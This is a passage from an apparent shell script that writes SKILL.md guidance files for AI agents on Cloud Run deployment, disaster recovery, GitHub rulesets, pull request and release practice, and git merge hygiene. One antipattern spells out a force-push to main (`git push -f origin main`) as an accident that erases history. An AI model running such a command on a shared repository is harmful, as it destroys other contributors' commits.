Container image URL, environment variables, Cloud SQL instance connection name, CPU/memory allocations, and scaling parameters.

## Instructions
1. Cloud Run Scaling and Resource Configuration:
   - Allocate adequate memory and CPU: e.g., `--memory 1Gi --cpu 1`.
   - Prevent Cold Starts on Latency-Sensitive Endpoints: Configure `--min-instances 1` or `2` to keep warm container instances ready for immediate request processing.
   - Configure Concurrency: Set `--concurrency 80` (or appropriate thread limit for the runtime) to allow multiple concurrent requests per container instance, drastically reducing infrastructure costs compared to single-concurrency Lambda.
   - Configure Maximum Instances: Always set `--max-instances` to prevent uncontrolled auto-scaling from exhausting downstream database connections or exceeding cloud budgets during DDoS attacks.
2. Secure Database Connectivity with Cloud SQL Auth Proxy:
   - Never expose Cloud SQL to the public internet.
   - Connect via Cloud Run's built-in Cloud SQL integration: configure `--add-cloudsql-instances project:region:instance` and connect via Unix domain socket (`/cloudsql/project:region:instance`).
3. Inject Secrets via Secret Manager:
   - Never pass plaintext passwords or API keys in `--set-env-vars`.
   - Mount secrets as environment variables directly from Google Secret Manager: `--set-secrets DB_PASSWORD=projects/PROJECT_ID/secrets/db-pass:latest`.
4. Dedicated Service Account with Least Privilege:
   - Create a dedicated Google Service Account for the Cloud Run service (`--service-account my-service@project.iam.gserviceaccount.com`).
   - Grant only specific roles: `roles/cloudsql.client`, `roles/secretmanager.secretAccessor`.

## Constraints / Rules
- Never deploy Cloud Run services using the default Compute Engine service account (`[project-number]-compute@developer.gserviceaccount.com`), which has broad editor permissions.
- Never run Cloud Run services without a configured `--max-instances` limit.
- Do not write persistent data to the local container filesystem; local container filesystems are ephemeral and memory-backed.

## Workflow
1. Build and push container image to Artifact Registry.
2. Provision dedicated Service Account and grant required IAM roles.
3. Configure secrets in Secret Manager.
4. Deploy to Cloud Run with concurrency, min/max instances, and Cloud SQL flags.
5. Verify health checks and auto-scaling behavior.

## Expected Output
Google Cloud deployment script (gcloud CLI or Terraform) configuring Cloud Run service parameters, Secret Manager bindings, Cloud SQL Unix sockets, and custom service accounts.

## Validation Checklist
- [ ] Is a dedicated service account assigned to the Cloud Run service?
- [ ] Is `--max-instances` configured to protect downstream resources?
- [ ] Are secrets mounted directly from Secret Manager?
- [ ] Is database connectivity routed via Unix domain socket or Private IP?
- [ ] Is cold start mitigated using `--min-instances` where necessary?

## Common Mistakes & Antipatterns
- Using the default service account, giving the containerized app permission to modify almost every resource in the GCP project.
- Setting `--concurrency 1` for a Node.js or Go application, forcing Cloud Run to launch a new container for every single concurrent request, inflating costs by 80x.
- Storing uploaded files in `/tmp` in the container, wondering why user files vanish when Cloud Run scales down or restarts.

## Concrete Real-World Example
Scenario: A web API deployed on Cloud Run suffers from 4-second cold starts, exposes plaintext DB passwords in the deploy command, and connects to Cloud SQL over the public internet.
Prompt: Author a production deployment script for this Cloud Run service resolving cold starts and security issues.
Application: The AI creates a dedicated service account with `cloudsql.client` and `secretAccessor`, sets `--min-instances 1` and `--concurrency 80`, mounts database credentials from Secret Manager, and routes database traffic through the native `/cloudsql/...` Unix socket.
EOF

cat << 'EOF' > skills/cloud/general/multi-region-disaster-recovery/SKILL.md
---
name: "multi-region-disaster-recovery"
description: "Architecting multi-region high availability and disaster recovery strategies (Active-Active, Active-Passive, Pilot Light) with DNS failover, RPO/RTO budgeting, and data replication."
category: "cloud"
subcategory: "general"
language: "agnostic"
framework: "none"
technology: "cloud-architecture"
difficulty: "advanced"
tags: ["cloud", "disaster-recovery", "high-availability", "multi-region", "rpo-rto", "failover"]
---

# Cloud Multi-Region Disaster Recovery and High Availability

## Purpose
Provide AI agents with rigorous architectural principles for designing resilient multi-region cloud disaster recovery strategies tailored to Recovery Point Objective (RPO) and Recovery Time Objective (RTO) targets.

## When to Use
Use when designing enterprise cloud architectures, drafting business continuity plans, preparing for regional data center outages, or meeting regulatory uptime requirements.

## Inputs / Context
Target RTO (time to restore service), target RPO (acceptable data loss window), budget constraints, and database replication capabilities.

## Instructions
1. Define and Budget RPO and RTO Targets:
   - Recovery Point Objective (RPO): Maximum acceptable data loss measured in time (e.g., RPO = 15 minutes means up to 15 minutes of transactional data can be lost during an unrecoverable failure).
   - Recovery Time Objective (RTO): Maximum acceptable downtime to restore operations (e.g., RTO = 1 hour means service must be operational within 60 minutes).
2. Select the Appropriate Disaster Recovery Strategy:
   - Backup & Restore (RPO: hours, RTO: 24h+): Lowest cost. Daily/hourly backups replicated to a secondary region. Compute provisioned from scratch upon disaster.
   - Pilot Light (RPO: minutes, RTO: hours): Database is continuously replicated to secondary region. Core infrastructure is pre-configured, but compute instances remain idle or scaled to zero until disaster.
   - Warm Standby / Active-Passive (RPO: seconds, RTO: minutes): Scaled-down version of full environment runs continuously in secondary region. Traffic shifted upon failure.
   - Multi-Region Active-Active (RPO: 0, RTO: 0): Full environments run simultaneously in two or more regions. Traffic balanced dynamically. Requires distributed databases (e.g., Spanner, CockroachDB, DynamoDB Global Tables).
3. Automated DNS Health Checks and Failover:
   - Configure global DNS (Route 53, Cloudflare) with automated health checks monitoring edge health endpoints.
   - Failover routing automatically redirects traffic away from an unhealthy region within 30-60 seconds.
4. Database Replication and Split-Brain Prevention:
   - Implement asynchronous cross-region database replication for Active-Passive; ensure fencing mechanisms exist so both regions never attempt primary writes simultaneously (Split-Brain catastrophe).
5. Regularly Execute Chaos Engineering / DR Drills:
   - A disaster recovery plan that has never been tested is not a disaster recovery plan. Schedule semi-annual simulated regional failover drills.

## Constraints / Rules
- Never claim zero RTO/RPO without implementing Active-Active distributed consensus databases.
- Avoid multi-region Active-Active writes on standard relational databases (Postgres/MySQL) without conflict resolution or sharding.
- Do not configure automated failover without verifying database replication lag metrics.

## Workflow
1. Calculate RTO, RPO, and budget parameters with stakeholders.
2. Select DR model (Backup & Restore, Pilot Light, Warm Standby, Active-Active).
3. Establish cross-region asynchronous data replication and replication lag alarms.
4. Configure global DNS routing with automated health checks.
5. Create automated runbook scripts for failover and failback.
6. Conduct simulated regional isolation drill.

## Expected Output
Disaster Recovery architecture blueprint specifying RPO/RTO parameters, cross-region replication topology, DNS failover configurations, and failover runbooks.

## Validation Checklist
- [ ] Are RPO and RTO quantitatively defined and approved?
- [ ] Is cross-region database replication configured and monitored for lag?
- [ ] Are global DNS health checks configured for automated failover?
- [ ] Are split-brain protections implemented on the database tier?
- [ ] Has the failover process been tested through a simulated drill?

## Common Mistakes & Antipatterns
- Automatically failing over to a secondary region when the secondary database is 3 hours behind on replication, causing 3 hours of silent data loss.
- Designing Active-Active multi-region writes on a standard single-leader Postgres database, corrupting primary keys and sequence IDs across regions.
- Documenting a DR plan in a PDF that nobody tests until a real outage occurs, only to discover the secondary region AMI images are 2 years out of date.

## Concrete Real-World Example
Scenario: An enterprise SaaS application experiences a 12-hour outage when an entire cloud region suffers an electrical fire because no secondary region infrastructure existed.
Prompt: Design an Active-Passive (Warm Standby) disaster recovery plan with RPO < 1 minute and RTO < 10 minutes.
Application: The AI designs a Warm Standby architecture replicating Postgres to a secondary region using streaming replication, maintains a minimal 2-instance compute pool warm in the secondary region, configures Route 53 DNS failover based on HTTPS health checks, and scripts automated autoscaling to handle 100% traffic on failover.
EOF

cat << 'EOF' > skills/github/repositories/branch-protection-and-rulesets/SKILL.md
---
name: "branch-protection-and-rulesets"
description: "Configuring enterprise GitHub repository security, modern Repository Rulesets, signed commits, linear history, and required status checks."
category: "github"
subcategory: "repositories"
language: "json"
framework: "github"
technology: "github-administration"
difficulty: "intermediate"
tags: ["github", "branch-protection", "rulesets", "security", "code-owners", "ci-cd"]
---

# GitHub Repository Security, Rulesets, and Branch Protection

## Purpose
Provide AI agents with standards for locking down GitHub repositories against accidental overrides, unreviewed commits, unverified code, and unauthorized branch deletions.

## When to Use
Use when creating new repositories, onboarding teams, hardening open-source projects, or preparing for SOC 2 / ISO 27001 compliance audits.

## Inputs / Context
Repository target, primary branch (`main`), required CI status checks, CODEOWNERS rules, and bypass actor lists.

## Instructions
1. Modernize with GitHub Repository Rulesets:
   - Use Repository Rulesets instead of legacy branch protection rules for unified, enforceable guardrails across multiple branches and tags.
2. Core Protection Directives for Default Branch (`main` / `master`):
   - Restrict Deletions: Prevent accidental deletion of production branches.
   - Restrict Force Pushes: Block `git push --force` completely for all users, including administrators.
   - Require Linear History: Prevent merge commits; enforce clean rebase or squash-and-merge histories.
   - Require Signed Commits: Enforce GPG, SSH, or S/MIME cryptographic commit signatures (`Require signed commits = true`) to prevent author spoofing.
3. Pull Request Requirements:
   - Require a pull request before merging.
   - Require minimum 1-2 approving reviews from collaborators.
   - Dismiss stale pull request approvals when new commits are pushed.
   - Require review from Code Owners (`CODEOWNERS` file).
   - Prevent the PR author from approving their own pull request.
4. Require Strict Status Checks:
   - Require status checks to pass before merging (e.g., CI test suite, linter, security scan).
   - Enable 'Require branches to be up to date before merging': ensures the PR is tested against the absolute latest code on `main` before merging.
5. Enable Automated Security Features:
   - Secret Scanning and Push Protection: Block commits containing API keys, AWS credentials, or private tokens before they ever reach the repository.
   - Dependabot alerts and security updates: Automatically open PRs for vulnerable dependencies.

## Constraints / Rules
- Never allow force-pushing to the default production branch.
- Never disable push protection for secrets scanning.
- Avoid exempting administrators from status checks and PR review requirements.

## Workflow
1. Create branch ruleset targeting `refs/heads/main`.
2. Configure PR requirements (approvals, code owners, dismiss stale).
3. Add required CI status checks matching workflow job names.
4. Enable Secret Scanning Push Protection in repository security settings.
5. Add `.github/CODEOWNERS` file mapping critical directories to team leads.

## Expected Output
Exported GitHub Ruleset JSON configuration and `.github/CODEOWNERS` file implementing strict branch safety and secret push protection.

## Validation Checklist
- [ ] Are force-pushes and branch deletions disabled?
- [ ] Are pull requests mandatory with at least 1 approval?
- [ ] Are stale reviews dismissed upon new commit pushes?
- [ ] Are required CI checks enforced on up-to-date branches?
- [ ] Is Secret Scanning Push Protection enabled?

## Common Mistakes & Antipatterns
- Enabling status checks without checking 'Require branches to be up to date', allowing PR 1 and PR 2 to pass CI independently, but break production when both are merged back-to-back.
- Allowing administrators to bypass branch rules, resulting in an admin accidentally running `git push -f origin main` and deleting months of commits.
- Leaving Secret Scanning disabled, resulting in leaked database passwords that are permanently indexed in Git history.

## Concrete Real-World Example
Scenario: A developer accidentally force-pushes an experimental rebase to `main`, overwriting 15 commits from colleagues and breaking the production deployment.
Prompt: Configure GitHub Repository Rulesets to permanently prevent force pushes and require CI checks and reviews on `main`.
Application: The AI writes a GitHub Ruleset configuration enforcing `non_fast_forward: true`, `deletion: true`, requiring 1 peer approval with stale approval dismissal, enforcing linear history, and requiring the `test-suite` CI check before merge.
EOF

cat << 'EOF' > skills/github/issues/actionable-bug-and-feature-templates/SKILL.md
---
name: "actionable-bug-and-feature-templates"
description: "Designing structured, actionable GitHub Issue Forms (.github/ISSUE_TEMPLATE/*.yml) for bug reports, feature requests, and security disclosures."
category: "github"
subcategory: "issues"
language: "yaml"
framework: "github"
technology: "github-issues"
difficulty: "beginner"
tags: ["github", "issues", "issue-templates", "bug-reports", "open-source", "maintainability"]
---

# Actionable GitHub Issue Forms and Bug Report Templates

## Purpose
Instruct AI agents to author structured GitHub Issue Forms using YAML syntax that compel issue reporters to provide complete diagnostic information, reproduction steps, and environment context.

## When to Use
Use when setting up open-source repositories, standardizing bug reporting for developer teams, or eliminating vague 'it doesn't work' tickets.

## Inputs / Context
Project technologies, required diagnostic details (OS, version, logs), and issue classification categories.

## Instructions
1. Standardize on Modern GitHub Issue Forms (YAML):
   - Use `.github/ISSUE_TEMPLATE/*.yml` rather than legacy markdown templates; YAML issue forms provide structured web input controls (dropdowns, checkboxes, code inputs, required fields).
2. Bug Report Form Structure (`bug-report.yml`):
   - Summary / Description (Textarea).
   - Minimal Reproduction Steps (Numbered list, required).
   - Expected vs Actual Behavior.
   - Code Sample or Reproduction Repository URL.
   - Environment Details (Dropdowns for OS, Node/Python version, Browser, Package version).
   - Stack Traces & Diagnostic Logs (Code textarea with markdown syntax highlighting).
   - Pre-submission Checklist (Confirming they searched existing open issues).
3. Feature Request Form Structure (`feature-request.yml`):
   - Problem Statement: What problem does this solve?
   - Proposed Solution: How should it work?
   - Alternatives Considered: What workarounds were explored?
   - Additional Context.
4. Configure Issue Form Configuration (`config.yml`):
   - Disable blank issues: `blank_issues_enabled: false`.
   - Provide external links for security vulnerabilities or community chat: `contact_links: [...]`.

## Constraints / Rules
- Never leave `blank_issues_enabled: true` in high-traffic open-source repositories.
- Avoid making forms so long and burdensome that users give up reporting legitimate bugs.
- Do not use issue forms for reporting security vulnerabilities; direct users to private security advisories or SECURITY.md.

## Workflow
1. Create `.github/ISSUE_TEMPLATE/` directory.
2. Author `bug-report.yml` with required fields and dropdowns.
3. Author `feature-request.yml` focusing on problem definition.
4. Author `config.yml` disabling blank issues and linking to security policy.
5. Validate YAML syntax against GitHub schema.

## Expected Output
Set of clean, valid GitHub Issue Forms (`bug-report.yml`, `feature-request.yml`, `config.yml`) enforcing complete reproduction context.

## Validation Checklist
- [ ] Are issue templates authored in GitHub YAML Issue Form syntax?
- [ ] Are reproduction steps marked as `required: true`?
- [ ] Are blank issues disabled via `config.yml`?
- [ ] Is security reporting routed away from public issues to private disclosures?
- [ ] Are environment dropdowns updated to reflect current supported versions?

## Common Mistakes & Antipatterns
- Leaving a generic markdown issue template that users completely delete to write 'It crashed please help', leaving zero diagnostic data.
- Forgetting to specify `render: shell` or `render: text` on log input fields, resulting in unformatted walls of text.
- Allowing users to file public bug reports for zero-day security vulnerabilities instead of private vulnerability reporting.

## Concrete Real-World Example
Scenario: An open-source library receives 20 issues a week saying 'Module fails to load' with no OS, no version, and no stack trace, wasting hours of maintainer time.
Prompt: Author a structured GitHub Issue Form in YAML to compel reporters to submit complete environment context and minimal reproductions.
Application: The AI creates `.github/ISSUE_TEMPLATE/bug-report.yml` with mandatory fields for reproduction steps, environment dropdowns (OS, Node version), a syntax-highlighted code block for stack traces, and a `config.yml` disabling unstructured blank issues.
EOF

cat << 'EOF' > skills/github/pull-requests/pr-review-and-squash-merge-standards/SKILL.md
---
name: "pr-review-and-squash-merge-standards"
description: "Establishing pull request submission standards, comprehensive PULL_REQUEST_TEMPLATE.md, atomic PR sizing, Conventional Commit squashing, and review etiquette."
category: "github"
subcategory: "pull-requests"
language: "markdown"
framework: "github"
technology: "pull-requests"
difficulty: "intermediate"
tags: ["github", "pull-requests", "code-review", "conventional-commits", "squash-merge"]
---

# Pull Request Architecture, Review Standards, and Squash Merge Hygiene

## Purpose
Provide AI agents with standards for creating reviewable, atomic pull requests, establishing structured PR templates, and maintaining a clean, descriptive Git history via Conventional Commit squash merges.

## When to Use
Use when opening pull requests, reviewing code contributions, designing team PR guidelines, or standardizing Git commit histories.

## Inputs / Context
Feature changes, branch diffs, related issue tickets, testing evidence, and review checklist.

## Instructions
1. Atomic Pull Request Sizing:
   - Keep pull requests small and focused: ideal PR size is under 250-400 lines of changed code. Large PRs (> 800 lines) receive superficial reviews and harbor hidden bugs.
   - Separate architectural refactorings into independent PRs distinct from feature or bug-fix PRs.
2. Author Comprehensive `PULL_REQUEST_TEMPLATE.md`:
   - Description & Motivation: What does this PR do and why?
   - Issue Linkage: Explicitly link issues to auto-close on merge (`Closes #123`, `Fixes #456`).
   - Type of Change: Bug fix, new feature, breaking change, documentation.
   - Testing Evidence: Detailed steps to test manually, plus automated test additions. Include screenshots/GIFs for UI changes.
   - Verification Checklist: Tests pass, documentation updated, no secrets committed.
3. Conventional Commit Squash-and-Merge Hygiene:
   - Enforce Squash Merging on repository settings to condense messy 'wip', 'typo', and 'fix review' commits into a single atomic commit on `main`.
   - Format the final squash commit title following Conventional Commits:
     `<type>(<scope>): <concise description> (#PR)`
     (e.g., `feat(auth): implement passkey registration and login (#142)`).
   - In the commit body, include a concise bullet list of what changed and reference closing issues.
4. Constructive Code Review Etiquette:
   - Prefix review comments with intent tags: `[blocking]`, `[suggestion]`, `[question]`, `[nitpick]`.
   - Explain the 'why' behind feedback, referencing authoritative documentation or design principles.

## Constraints / Rules
- Never merge PRs with unresolved blocking review comments.
- Avoid mixing formatting/linting sweeps with functional business logic changes in the same PR.
- Never use vague squash commit messages like 'Update file.js' or 'Merge pull request #5'.

## Workflow
1. Create feature branch named `feature/issue-slug` or `fix/issue-slug`.
2. Author changes and ensure tests pass locally.
3. Open PR populated via `PULL_REQUEST_TEMPLATE.md`.
4. Address reviewer comments with additional commits on the branch.
5. Squash and merge using Conventional Commit message format.

## Expected Output
Production `.github/PULL_REQUEST_TEMPLATE.md` file along with guidelines for atomic PR sizing and Conventional Commit squash formatting.

## Validation Checklist
- [ ] Is PR linked to target issues using `Closes #...`?
- [ ] Are manual and automated testing instructions documented?
- [ ] Are UI changes accompanied by visual screenshots/videos?
- [ ] Is the PR sized under 400 lines of functional change?
- [ ] Is the final squash commit formatted with Conventional Commits?

## Common Mistakes & Antipatterns
- Submitting a 3,000-line PR that combines an entire database migration, three new pages, and a massive ESLint refactor, overwhelming reviewers.
- Merging with a default squash commit message that dumps 45 messy commit messages (`wip`, `fix`, `asdf`) into the git log on `main`.
- Leaving PR descriptions completely blank, forcing reviewers to guess the motivation behind the change.

## Concrete Real-World Example
Scenario: A software team's git history is polluted with hundreds of commits named 'fix typo', 'test 2', and 'oops', making `git bisect` impossible to use.
Prompt: Standardize the team's pull request process using a structured template and Conventional Commit squash merge rules.
Application: The AI crafts `.github/PULL_REQUEST_TEMPLATE.md` with structured sections for context, testing verification, and screenshots, and establishes repository squash guidelines requiring `type(scope): description` format, cleaning up the commit log.
EOF

cat << 'EOF' > skills/github/actions/secrets-scanning-and-matrix-builds/SKILL.md
---
name: "secrets-scanning-and-matrix-builds"
description: "Constructing high-throughput GitHub Actions workflows with cross-platform matrix testing, fail-fast tuning, TruffleHog secret scanning, and artifact upload/download."
category: "github"
subcategory: "actions"
language: "yaml"
framework: "github-actions"
technology: "github-actions-ci"
difficulty: "intermediate"
tags: ["github", "github-actions", "matrix-builds", "secret-scanning", "trufflehog", "artifacts"]
---

# GitHub Actions Matrix Builds and Secret Scanning Automation

## Purpose
Instruct AI agents to configure GitHub Actions workflows that execute multi-platform test matrices and proactively scan git histories and pull requests for exposed secrets and tokens.

## When to Use
Use when building open-source libraries that must run across multiple operating systems and runtimes, or enforcing credential protection in CI.

## Inputs / Context
Target OS platforms (ubuntu, macos, windows), runtime versions (e.g., Node 18, 20, 22), test commands, and secret scanner configs.

## Instructions
1. Cross-Platform Matrix Build Strategies:
   - Configure multi-dimensional test matrices:
     `strategy: { matrix: { os: [ubuntu-latest, macos-latest, windows-latest], node-version: [18, 20, 22] } }`
   - Use `fail-fast: false` when you want all matrix jobs to complete so you can see every failing combination, or `fail-fast: true` to abort immediately on the first failure to save runner minutes.
   - Use `include` and `exclude` directives to add or omit specific matrix combinations (e.g., exclude Windows on Node 18).
2. Automate Secret Scanning with TruffleHog:
   - Add an automated secret scanning job to all PR and push events using TruffleHog OSS action.
   - Scan git commit history for verified high-entropy secrets (private keys, AWS keys, Stripe tokens):
     `uses: trufflesecurity/trufflehog@main with: { extra_args: "--only-verified" }`
   - Block PR merges if a verified secret is discovered.
3. Seamless Artifact Sharing Between Jobs:
   - Use `actions/upload-artifact@v4` in the build job to upload compiled binaries or frontend assets.
   - Use `actions/download-artifact@v4` in deployment or test jobs to download pre-built assets, eliminating redundant compilation steps.
4. Matrix Runner Concurrency and Resource Limits:
   - Be mindful of macOS runner costs (macOS runners cost 10x more than Linux runners); run full macOS matrices only on release branches or PRs modifying native mobile/desktop bindings.

## Constraints / Rules
- Never print secret values to the GitHub Actions workflow console log (`core.setSecret` must be used if dealing with dynamic credentials).
- Avoid running heavy multi-OS matrix builds on every minor doc commit.
- Do not use unpinned actions in security scanning jobs.

## Workflow
1. Define workflow triggered on `pull_request` and `push`.
2. Add secret scanning job with TruffleHog.
3. Configure build matrix testing across specified OS and runtime combinations.
4. Archive build artifacts.
5. Upload test coverage reports.

## Expected Output
Production GitHub Actions YAML workflow featuring multi-OS matrix testing, automated TruffleHog secret scanning, and artifact upload/download pipelines.

## Validation Checklist
- [ ] Is a multi-OS/runtime matrix configured?
- [ ] Is automated secret scanning active on all pull requests?
- [ ] Are compiled artifacts uploaded and shared between jobs without rebuilds?
- [ ] Are macOS runner minutes conserved prudently?
- [ ] Are secrets properly masked in logs?

## Common Mistakes & Antipatterns
- Running a 9-job matrix (3 OS x 3 Node versions) on every typo commit in a markdown file, exhausting the organization's monthly GitHub Actions free minutes in 3 days.
- Logging raw HTTP request headers in CI, exposing the `Authorization: Bearer <token>` in public workflow logs.
- Failing to verify that all matrix jobs passed before triggering deployment.

## Concrete Real-World Example
Scenario: An open-source TypeScript SDK needs to verify compatibility across Ubuntu, macOS, Windows on Node 18, 20, and 22, while ensuring no developer accidentally commits an API key.
Prompt: Author a GitHub Actions workflow with matrix testing and TruffleHog secret scanning.
Application: The AI creates a workflow with a `security-scan` job running TruffleHog with `--only-verified`, followed by a `test-matrix` job running across the 3x3 OS/Node matrix with dependency caching and artifact archiving.
EOF

cat << 'EOF' > skills/github/releases/semantic-versioning-and-changelog-generation/SKILL.md
---
name: "semantic-versioning-and-changelog-generation"
description: "Automating semantic version releases (MAJOR.MINOR.PATCH) using Conventional Commits, release-please or semantic-release, and generating Keep-a-Changelog notes."
category: "github"
subcategory: "releases"
language: "yaml"
framework: "github-actions"
technology: "semantic-versioning"
difficulty: "intermediate"
tags: ["github", "releases", "semver", "changelog", "release-please", "conventional-commits"]
---

# Semantic Versioning (SemVer) and Automated Release Changelogs

## Purpose
Provide AI agents with standards for automating software releases based on Semantic Versioning specifications, Conventional Commits, and automated changelog publishing.

## When to Use
Use when setting up automated package publishing (npm, PyPI, Crates.io), managing software releases, or automating CHANGELOG.md generation.

## Inputs / Context
Commit history, package manifest (`package.json`, `pyproject.toml`), target release branch, and GitHub API credentials.

## Instructions
1. Adhere Strictly to Semantic Versioning 2.0.0 (`MAJOR.MINOR.PATCH`):
   - `MAJOR` version: Incompatible API changes / breaking changes.
   - `MINOR` version: New functionality added in a backward-compatible manner.
   - `PATCH` version: Backward-compatible bug fixes.
2. Automate Version Bumping via Conventional Commits:
   - `fix:` bumps PATCH (e.g., 1.0.0 -> 1.0.1).
   - `feat:` bumps MINOR (e.g., 1.0.0 -> 1.1.0).
   - `feat!:`, `fix!:`, or commit body with `BREAKING CHANGE:` bumps MAJOR (e.g., 1.0.0 -> 2.0.0).
   - `chore:`, `docs:`, `style:`, `refactor:`, `test:` trigger NO release.
3. Automate Releases with Release Please or Semantic Release:
   - Use Google's `release-please-action` to automatically maintain a running Release Pull Request that updates version numbers in manifests and appends notes to `CHANGELOG.md`.
   - When the Release PR is merged, the action automatically tags the commit (`vX.Y.Z`), creates a GitHub Release, and triggers publishing workflows.
4. Follow Keep a Changelog Format in `CHANGELOG.md`:
   - Categorize entries into standard subheadings: `Added`, `Changed`, `Deprecated`, `Removed`, `Fixed`, `Security`.
   - Include comparison links at the bottom: `[1.1.0]: https://github.com/org/repo/compare/v1.0.0...v1.1.0`.
5. Publish Artifacts to Registries Post-Release:
   - Trigger npm, PyPI, or Docker image publishing strictly upon GitHub Release creation (`on: release: { types: [published] }`).

## Constraints / Rules
- Never manually edit version numbers or changelog files when automated release tooling is active.
- Never publish a breaking change under a MINOR or PATCH version bump.
- Avoid publishing releases from unverified or dirty local developer machines.

## Workflow
1. Enforce Conventional Commit messages on PR merges.
2. Run `release-please-action` on pushes to `main`.
3. Release PR is created/updated automatically with version bump and changelog.
4. Maintainer merges Release PR.
5. Action creates Git tag, GitHub Release, and dispatches package publish.

## Expected Output
Automated release workflow configuration (`release-please.yml`) and `CHANGELOG.md` template conforming to SemVer 2.0 and Keep a Changelog standards.

## Validation Checklist
- [ ] Does commit message syntax dictate SemVer version bumps?
- [ ] Is `CHANGELOG.md` updated automatically following Keep a Changelog?
- [ ] Are breaking changes signaled with `!` or `BREAKING CHANGE:`?
- [ ] Are releases triggered strictly from the protected default branch?
- [ ] Are comparison diff links included for every release tag?

## Common Mistakes & Antipatterns
- Introducing a breaking API change in a `feat:` commit without `!` or `BREAKING CHANGE:`, bumping only the MINOR version and breaking all downstream consumers.
- Manually editing `package.json` to change the version, causing merge conflicts with the automated release bot.
- Publishing packages directly from a developer's laptop rather than an audited, reproducible CI pipeline.

## Concrete Real-World Example
Scenario: A team spends 2 hours every release manually writing changelogs, bumping versions across 3 files, and tagging Git releases.
Prompt: Automate the entire semantic versioning and changelog publishing pipeline using Conventional Commits and Release Please.
Application: The AI configures `.github/workflows/release.yml` with `googleapis/release-please-action`, enforces Conventional Commits on PR squash merges, and connects the release hook to publish the package to npm automatically on tag creation.
EOF

cat << 'EOF' > skills/git/branching/trunk-based-development/SKILL.md
---
name: "trunk-based-development"
description: "Implementing Trunk-Based Development (TBD), short-lived feature branches, feature flags, and continuous integration to eliminate merge debt and drift."
category: "git"
subcategory: "branching"
language: "agnostic"
framework: "none"
technology: "git-workflow"
difficulty: "intermediate"
tags: ["git", "trunk-based-development", "branching", "feature-flags", "ci-cd", "merge-debt"]
---

# Trunk-Based Development and Short-Lived Feature Branches

## Purpose
Provide AI agents with standards for executing Trunk-Based Development, deprecating long-lived feature branches (Gitflow), and integrating code continuously to eliminate merge conflicts.

## When to Use
Use when establishing team Git workflows, transitioning away from painful multi-month Gitflow branch merges, or accelerating delivery speed.

## Inputs / Context
Feature scope, development velocity, feature flagging system, and release cadence.

## Instructions
1. Core Tenet of Trunk-Based Development (TBD):
   - All developers commit to a single shared branch ('trunk', usually `main`) frequently (at least daily).
   - Feature branches must be Short-Lived: lifetime should be under 1-2 days (maximum 3 days).
2. Decouple Deployment from Release using Feature Flags:
   - Merge incomplete or in-progress features into the trunk behind Feature Flags (toggles).
   - Code is continuously deployed to production dark (inactive), verified with internal users, and enabled for customers dynamically without code deployments.
3. Eliminate Gitflow Bottlenecks:
   - Deprecate long-lived branches (`develop`, `feature-xyz` lasting 3 weeks, `release-1.2`).
   - Long-lived branches accumulate 'merge debt': the longer a branch diverges from `main`, the higher the risk of catastrophic merge conflicts and integration regressions.
4. Continuous Rebase against Trunk:
   - Developers should rebase their short-lived branch onto `origin/main` daily: `git fetch origin && git rebase origin/main`.
5. Fast Automated CI Gates:
   - Comprehensive automated test suite must run and pass in under 5-10 minutes on every pull request to maintain high trunk integration velocity.

## Constraints / Rules
- Never allow feature branches to live longer than a few days without merging to trunk.
- Avoid deploying unfinished user-facing features without feature flag gating.
- Do not maintain parallel persistent `develop` and `main` branches.

## Workflow
1. Pull latest trunk: `git checkout main && git pull`.
2. Create short-lived branch: `git checkout -b feat/task-slug`.
3. Wrap new code paths in feature flag check.
4. Push small PR (under 300 lines) within 24-48 hours.
5. Rebase onto latest `origin/main`.
6. Merge to trunk upon CI pass and delete branch.

## Expected Output
Trunk-based workflow specification and feature flag integration pattern supporting rapid continuous integration and zero merge debt.

## Validation Checklist
- [ ] Are feature branches merged into trunk within 1-2 days?
- [ ] Are incomplete features protected behind runtime feature flags?
- [ ] Is code rebased onto latest trunk before merge?
- [ ] Is CI execution time optimized to <= 10 minutes?
- [ ] Are merged feature branches deleted immediately?

## Common Mistakes & Antipatterns
- Keeping a feature branch open for 6 weeks, resulting in 400 conflicting files when attempting to merge back into `main`.
- Merging incomplete features directly into production without feature flags, exposing broken half-finished UI to customers.
- Using Gitflow in a modern continuous delivery environment, adding manual ceremony and delay without quality benefits.

## Concrete Real-World Example
Scenario: A software team struggles with 'merge hell' every two weeks where merging long-lived feature branches into `develop` takes 3 days and breaks existing features.
Prompt: Transition this engineering team from Gitflow to Trunk-Based Development with feature flags.
Application: The AI designs a migration plan eliminating the `develop` branch, institutes a 2-day maximum branch lifespan policy, implements a lightweight feature flag wrapper in application code, and configures automated branch deletion upon merge.
EOF

cat << 'EOF' > skills/git/merging/fast-forward-and-squash-hygiene/SKILL.md
---
name: "fast-forward-and-squash-hygiene"
description: "Mastering Git merge strategies (Fast-Forward, Non-Fast-Forward, Squash, Rebase) and maintaining a pristine, bisectable linear commit history."
category: "git"
subcategory: "merging"
language: "bash"
framework: "none"
technology: "git"
difficulty: "intermediate"
tags: ["git", "merging", "fast-forward", "squash", "rebase", "git-history", "bisect"]
---

# Git Fast-Forward, Rebase, and Squash Merge Hygiene

## Purpose
Instruct AI agents to select and execute optimal Git merge strategies, eliminating redundant merge bubbles and preserving a clean linear history for `git bisect` debugging.

## When to Use
Use when merging branches, configuring repository merge options, cleaning up feature histories, or preparing release commits.

## Inputs / Context
Current branch, target branch, commit count, and repository merge policy.

## Instructions
1. Understand the Merge Strategies:
   - Fast-Forward (`git merge --ff-only`): If target branch has not diverged, simply advances the branch pointer forward. Leaves zero merge commits. Pristine linear history.
   - Non-Fast-Forward (`git merge --no-ff`): Always creates a merge commit, even if fast-forward was possible. Documents that a group of commits belonged together.
   - Squash Merge (`git merge --squash`): Condenses all commits from the source branch into a single new commit on the target branch. Best for feature PRs with noisy interim commits.
   - Rebase Merge (`git rebase` followed by `--ff-only`): Replays commits individually on top of target branch, preserving individual commits without merge nodes.
2. Select Strategy by Context:
   - For Pull Requests into `main`: Prefer Squash Merge with Conventional Commit titles to preserve a clean, bisectable linear history.
   - For Local Branch Synchronization: Always use `git pull --rebase` to avoid creating useless 'Merge branch main into feat' bubble commits.
3. Configure Safe Defaults in Git Config:
   - `git config --global pull.rebase true`: Guarantees local pulls never create merge commits.
   - `git config --global merge.ff only`: Prevents accidental non-fast-forward merges during local branch integrations.
4. Maintain `git bisect` Viability:
   - Every single commit on `main` must compile and pass automated tests; squash merging ensures `main` never contains intermediate broken commits that thwart automated binary bug hunting with `git bisect`.

## Constraints / Rules
- Never push local 'Merge branch main into my-branch' commits to shared remote branches.
- Never use squash merge if individual commits on the branch represent distinct, independent releases that need separate rollback capabilities.
